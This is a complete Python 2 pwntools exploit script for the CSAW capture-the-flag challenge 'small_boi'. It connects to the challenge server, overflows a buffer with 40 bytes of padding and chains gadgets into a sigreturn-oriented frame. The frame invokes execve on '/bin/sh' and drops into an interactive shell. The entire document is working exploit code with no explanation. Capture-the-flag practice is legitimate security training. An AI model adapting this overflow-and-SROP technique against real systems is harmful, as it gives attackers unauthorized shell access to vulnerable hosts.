#!/usr/bin/env python2
from pwn import *
e = ELF('./small_boi')
#p = process('./small_boi')
p = remote('pwn.chal.csaw.io',1002)
context.arch="amd64"
padding = "A"*40

rw = 0x601000+100
payload = padding + p64(0x40018a) + p64(rw) + p64(0x40018c) + p64(0x40018a) + p64(0xf) + p64(0x400185)

shell = "/bin/sh\x00"
frame = SigreturnFrame(kernel="amd64")
frame.rax = 59
frame.rdi = 0x4001ca
frame.rsi = 0
frame.rdx = 0
frame.rsp = rw
frame.rip = 0x400185
payload += str(frame)
payload += p64(rw)
p.sendline(payload)
__import__('time').sleep(0.5)
p.sendline(shell)
p.interactive()
